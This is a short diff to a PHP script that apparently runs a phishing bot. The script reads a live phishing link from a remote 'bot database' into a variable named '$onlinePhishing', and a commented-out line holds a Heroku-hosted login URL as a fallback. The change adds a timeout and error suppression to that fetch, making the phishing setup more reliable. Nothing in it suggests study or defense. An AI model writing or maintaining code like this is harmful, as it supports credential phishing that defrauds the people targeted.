@@ -24,7 +24,8 @@ $BotWebhookUrl = $config_data->bot->webhookUrl;
 $_BotWebhookUrl = $BotWebhookUrl;
 //$_BotWebhookUrl = "False";
 
-$onlinePhishing = file_get_contents ("$BotDatabaseUrl/link.txt");
+$_db_ctx = stream_context_create(['http' => ['timeout' => 3], 'https' => ['timeout' => 3]]);
+$onlinePhishing = @file_get_contents("$BotDatabaseUrl/link.txt", false, $_db_ctx);
 //$onlinePhishing = "https://muroo.herokuapp.com/index.php?login";
 
 
